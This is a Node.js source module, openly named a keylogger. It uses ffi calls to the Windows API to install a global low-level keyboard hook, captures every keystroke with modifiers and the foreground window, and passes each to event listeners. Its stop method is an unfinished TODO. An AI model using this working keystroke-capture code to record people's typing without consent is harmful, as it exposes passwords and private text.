pkg('op.keylogger', () => {

	var log = pkg('util.log'),
		winapi = pkg('win.api'),
		ref = pkg.external('ref'),
		refArray = pkg.external('ref-array'),
		ffi = pkg.external('ffi'),
		Event = pkg('util.event'),
		childProc = pkg.external('child_process'),
		Struct = pkg.external('ref-struct');
	
	var Keylogger = function(){ 
		this.onKeyPress = new Event();
	}
	
	var messagePumpIsWorking = false;
	var setupMessagePump = () => {
		if(messagePumpIsWorking) return;
		messagePumpIsWorking = true;
		
		var message = new winapi.msg();
		winapi.PeekMessageW(message.ref(), 0, 0, 0, 1);
		
		setInterval(() => { while(winapi.PeekMessageW(message.ref(), 0, 0, 0, 1)); }, 10).unref();
	}
	
	var ByteArray = refArray('uint8');
	var getSpecialKeyState = () => {
		var bytes = new ByteArray(256);
		
		//console.log(bytes[0] + ' ' + bytes[1] + ' ' + bytes[2] + ' ' + bytes[3] + ' ' + bytes[4] + ' ' + bytes[5] + ' ' + bytes[6] + ' ' + bytes[7]);
		
		winapi.GetKeyState(0);
		if(!winapi.GetKeyboardState(bytes.buffer)) log('Failed to call GetKeyboardState: ' + winapi.GetLastError());
		
		//bytes = bytesRef.deref();
		
		return {
			alt: bytes[winapi.vk.alt] & 0x80? true: false,
			ctrl: bytes[winapi.vk.control] & 0x80? true: false,
			shift: bytes[winapi.vk.shift] & 0x80? true: false,
			caps: bytes[winapi.vk.caps] & 0x80? true: false,
			scroll: bytes[winapi.vk.scroll] & 0x80? true: false
		}
	}
	
	var setGlobalKeyboardHook = handler => {
		setupMessagePump();
		
		var callback = ffi.Callback(ref.refType(winapi.kbDllHookStruct), ['int', 'uint', ref.refType(winapi.kbDllHookStruct)], (nCode, messageType, dataPtr) => {
			if(nCode < 0) return winapi.CallNextHookEx(0, nCode, messageType, dataPtr);
			
			var data = dataPtr.deref();
			
			var mods = getSpecialKeyState();
			mods.extended = data.flags & winapi.LLKHF_EXTENDED? true: false;
			mods.injected = data.flags & winapi.LLKHF_INJECTED? true: false;
			
			var eventData = {
				mods: mods,
				vk: data.vkCode,
				sc: data.scanCode,
				char: data.vkCode in winapi.vkReverse && winapi.vkReverse[data.vkCode].length === 1? winapi.vkReverse[data.vkCode]: null,
				line: !(data.vkCode in winapi.vkReverse)? null: 
					(mods.ctrl && data.vkCode !== winapi.vk.lctrl && data.vkCode !== winapi.vk.rctrl? 'ctrl+': '') +
					(mods.alt && data.vkCode !== winapi.vk.lalt && data.vkCode !== winapi.vk.ralt? 'alt+': '') +
					(mods.shift && data.vkCode !== winapi.vk.lshift && data.vkCode !== winapi.vk.rshift? 'shift+': '') +
					(mods.caps? 'caps+': '') +
					(mods.scroll? 'scroll+': '') +
					winapi.vkReverse[data.vkCode],
				direction: messageType === winapi.WM_KEYDOWN || messageType === winapi.WM_SYSKEYDOWN? 'down': 'up',
				hwnd: winapi.GetForegroundWindow()
			};
			
			var isProcessed = handler(eventData);
			
			if(isProcessed){
				var buf = new Buffer(4);
				buf.writeInt32LE(1, 0);
				return buf;
			} else {
				return winapi.CallNextHookEx(0, nCode, messageType, ref.NULL);
			}
			
		});
		
		process.on('exit', () => { callback }); // keep the callback away from GC!
		winapi.SetWindowsHookExW(winapi.WH_KEYBOARD_LL, callback, 0, 0);
	}
	
	Keylogger.prototype = {
		start: function(){ 
			setGlobalKeyboardHook(data => {
				data.prevent = false;
				this.onKeyPress.fire(data);
				return data.prevent;
			});
			
			return this;
		},
		stop: function(){ 
			//TODO: actually revert effect of SetWindowsHookExW here
			return this;
		}
	};
	
	return Keylogger;

});